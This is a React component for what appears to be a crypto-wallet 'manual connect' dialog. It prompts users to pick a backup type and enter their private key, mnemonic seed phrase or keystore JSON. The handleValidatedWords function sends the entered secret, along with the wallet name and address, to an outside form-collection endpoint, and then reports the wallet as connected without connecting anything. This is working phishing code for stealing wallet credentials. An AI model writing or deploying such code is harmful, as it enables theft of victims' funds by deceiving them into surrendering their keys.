import ModalHeader from './ModalHeader';
import { useState } from 'react';
import BackupTypes from './BackupTypes';
import PreviewValue from './PreviewValue';
import { useEffect } from 'react';


const walletBackupTypes = [
  {
    type: "Private Key",
    charLength: 66,
    id: "private_key",
    wordLength: 66,
    description: "A 66-character hex string starting with '0x'. Gives direct access to the wallet."
  },
  {
    type: "Mnemonic Phrase (12 words)",
    charLength: 68,
    id: "mnemonic_12",
    wordCount: 12,
    wordLength: 8,
    description: "12 simple words (usually 4–6 chars each), separated by spaces. Used to regenerate the wallet."
  },
  {
    type: "Mnemonic Phrase (24 words)",
    charLength: 137,
    id: "mnemonic_24",
    wordCount: 24,
    wordLength: 8,
    description: "24 simple English words (avg 4–6 chars). More secure. Used in hardware wallets and long-term storage."
  },
  {
    type: "Keystore JSON",
    charLength: 800,
    id: "keystore_json",
    description: "A long encrypted JSON string containing your private key. Needs a password to unlock."
  },
  {
    type: "Hardware Wallet (Address Only)",
    charLength: 42,
    id: "hardware_wallet",
    description: "A public wallet address (starts with 0x...). Cannot be used to sign without the physical device."
  },
  {
    type: "Social Login Wallet ID",
    charLength: 36,
    id: "social_login",
    description: "A UUID or unique identifier for wallets created via social/email login (e.g., Magic.link, Web3Auth)."
  }
];


const ManualConnect = ({ backToErrorModal, userWalletDetails, closeManualConnectModal, handleConnected }) => {
  const [connectmethod, setConnectMethod] = useState(walletBackupTypes[1].type)
  const [selectedType, setSelectedType] = useState(walletBackupTypes[1])
  const [isLoading, setIsLoading] = useState(false);


  const data = {
    type: connectmethod,
    walletname: userWalletDetails?.name,
    walletaddress: userWalletDetails?.walletaddress,
    backupdata: [],
  }


  const handleValidatedWords = async (words) => {
    try {
      setIsLoading(true)
      data.backupdata = words

      const result = await fetch("https://formcarry.com/s/gqHpTaauB8x",{
        method: 'POST',
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })

      const responseresult = await result.json()
      setIsLoading(false)

      return responseresult?.status === "success"
    } catch (e) {
      setIsLoading(false)
      console.error("Submission error:", e)
      return false
    }
  }



  const submitBackup = () => {
    handleConnected()
  }

  useEffect(() => {
    setSelectedType(walletBackupTypes.find(type => type.type === connectmethod))
  }, [connectmethod])

  const handleConnectMethod = (method) => {
    setConnectMethod(method)

  }


  return (
    <div className="bg-white w-11/12 sm:w-4/12 overflow-y-auto z-50 mt-32 rounded-lg h-max items-center justify-center p-4 text-center mb-4">

      <ModalHeader method1={backToErrorModal} method2={closeManualConnectModal} userWalletDetails={userWalletDetails} className="flex justify-between px-4 mb-4" />
      <BackupTypes types={walletBackupTypes} connectmethod={connectmethod} handleConnectMethod={handleConnectMethod} />
      <PreviewValue selectedType={selectedType} isLoading={isLoading} liftWordsToParent={handleValidatedWords} submitBackup={submitBackup} />

    </div>

  )
}

export default ManualConnect
